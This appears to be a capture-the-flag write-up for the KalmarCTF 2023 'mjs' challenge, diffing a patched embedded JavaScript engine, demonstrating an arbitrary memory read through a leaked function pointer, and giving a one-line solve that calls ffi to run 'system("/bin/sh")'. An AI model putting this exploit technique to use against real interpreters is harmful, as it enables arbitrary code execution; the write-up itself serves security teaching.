# mjs
###### tags: `KalmarCTF` `2023` `pwn` `web` `mjs` `javascript` `runtime` `browser` `couldn't`
## Examine
### what patched
As you can see, this challenge source code is changed from origin code.
i think that some of function changed to easy.

![](https://i.imgur.com/dJWwTj3.png)

Let's extract the changes made.

first, let's see from foo_bar/src/mjs_builtin.c
```c=
diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c                                                                                                     
index 6f51e08..36c2b43 100644                                                                                                                          
--- a/src/mjs_builtin.c                                                                                                                                
+++ b/src/mjs_builtin.c   

-  mjs_set(mjs, obj, "ffi", ~0,                                                                                                                        
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));                                                                                   
-  mjs_set(mjs, obj, "ffi_cb_free", ~0,                                                                                                                
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));                                                                                
-  mjs_set(mjs, obj, "mkstr", ~0,                                                                                                                      
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));                                                                                      
+  /* mjs_set(mjs, obj, "ffi", ~0, */                                                                                                                  
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */                                                                             
+  /* mjs_set(mjs, obj, "ffi_cb_free", ~0, */                                                                                                          
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */                                                                          
+  /* mjs_set(mjs, obj, "mkstr", ~0, */                                                                                                                
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
    
-  mjs_set(mjs, obj, "s2o", ~0,                                                                                                                        
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));                                                                                        
+  /* mjs_set(mjs, obj, "s2o", ~0, */                                                                                                                  
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */   
```

i realized somthing.
- `ffi`,`ffi_cb_free`,`mkstr`,`s20` function were commented

Second, let's see `src/mjs_exec.c`
```c=
diff --git a/src/mjs_exec.c b/src/mjs_exec.c                                                                                                           
index bd48fea..24c2c7c 100644                                                                                                                          
--- a/src/mjs_exec.c                                                                                                                                   
+++ b/src/mjs_exec.c                                                                                                                                   
@@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) {                                                   
-                                                                                                                                                      
           *func = MJS_UNDEFINED;  // Return value                                                                                                     
           // LOG(LL_VERBOSE_DEBUG, ("CALLING  %d", i + 1));                                                                                           
-        } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) {                                                                                   
+        } else if (mjs_is_ffi_sig(*func)) {                                                                                                           
           /* Call ffi-ed function */                                            
```
i realized something
- Looser conditions
## what about mjs
i don't know mjs.
let's play a little bit.


```javascript=
//demo.js
function hello(){
  pirnt("hello");
}
let name = "rivi";
print("hello! " + name);

let name_hex = name.at(0);
print('another name for you is:');
print(name_hex);

let profile = {favorite: "javascript"};
let o = Object.create(profile);

let profile_str = JSON.stringify(o);
print(profile_str);
```
```bash=
$ ./mjs -f demo.js
hello! rivi 
another name for you is: 
114 
{"__p":{"favorite":"javascript"}} 
undefined
```

what's about `undefined`? The phenomenon is puzzling.


```javascript=
// demo2.js
let name = "rivi";
print("hello! " + name);
5
```
```
$ ./mjs -f demo2.js
hello! rivi 
5
```
i'll try to fuzzy

```javascript=
//demo3.js
print(print);
```
```
$ ./mjs -f demo3.js
<foreign_ptr@55b9637f1660> 
undefined
```

i received foreign_ptr.
the address starts with the 66 is very suspicious.

gdb is loaded mjs
```
gef➤  p mjs_print
$1 = {void (struct mjs *)} 0x555555559660 <mjs_print>
gef➤  c
Continuing.
<foreign_ptr@555555559660> 
undefined
[Inferior 1 (process 182522) exited normally]
```

mjs output same address about mjs_print as gdb
that's pretty crazy
```javascript=
//demo4.js
print(print[0]);
print(print[1]);
print(print[2]);
print(print[3]);
```
```
gef➤  x/4ub mjs_print
0x555555559660 <mjs_print>:	85	72	137	229
gef➤  c
Continuing.
85 
72 
137 
229 
undefined
```
this result is stupid!!
i can read and write anywhere.


we can't normally call on code.
but ffi_call exist on mjs yet.
![](https://i.imgur.com/WKMGHjZ.png)

## Solve 1
```
// demo5.js
let p = print + 0x6ab0;
p("int system(char *)")("/bin/sh");
```
## Solve2
this solve use traditional exploitation method instead of `ffi`.
that method is GOT overwrite.

## Source Code

https://github.com/kalmarunionenctf/kalmarctf-2023/tree/main/pwn/mjs

## Ref
- 